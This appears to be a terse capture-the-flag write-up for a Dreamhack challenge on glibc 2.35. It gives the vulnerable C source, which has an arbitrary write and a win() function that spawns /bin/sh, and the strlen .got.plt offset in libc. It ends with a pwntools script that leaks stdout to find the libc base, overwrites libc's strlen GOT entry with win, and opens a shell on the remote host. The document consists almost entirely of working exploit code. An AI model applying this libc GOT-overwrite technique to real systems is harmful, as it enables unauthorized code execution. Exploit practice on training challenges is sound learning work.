glibc 2.35 ver

```c
#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>

void init() {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    setbuf(stderr, NULL);
}

void win() {
    system("/bin/sh");
}


int main(int argc, char *argv[])
{
    size_t *addr;
    size_t value;

    init();

    printf("[libc GOT Overwrite]\n");

    printf("stdout: %p\n", stdout);
    printf("win: %p\n", win);
    printf("Address: ");
    scanf("%zu", (size_t *) &addr);
    printf("Value: ");
    scanf("%zu", &value);
    *addr = value;
    printf("Overwrite Done!\n");
}
```
---
```c
.got.plt:0000000000219098 off_219098 dq offset strlen ; DATA XREF: j_strlen+4↑r
```
---
got.plt offset

payload
```c
from pwn import *

p = remote("host8.dreamhack.games",23577)

stdout_offset = 0x21a780
strlen_offset = 0x219098

p.recvuntil(b"stdout: 0x")
stdout_st = int(p.recv(12),16)
libc_base = stdout_st - stdout_offset
strlen_offset += libc_base
print(hex(stdout_st))

p.recvuntil(b"win: 0x")
win_addr = int(p.recv(12),16)
print(hex(win_addr))

p.sendlineafter(b"Address: ",str(strlen_offset).encode())
p.sendlineafter(b"Value: ",str(win_addr).encode())

p.interactive()
```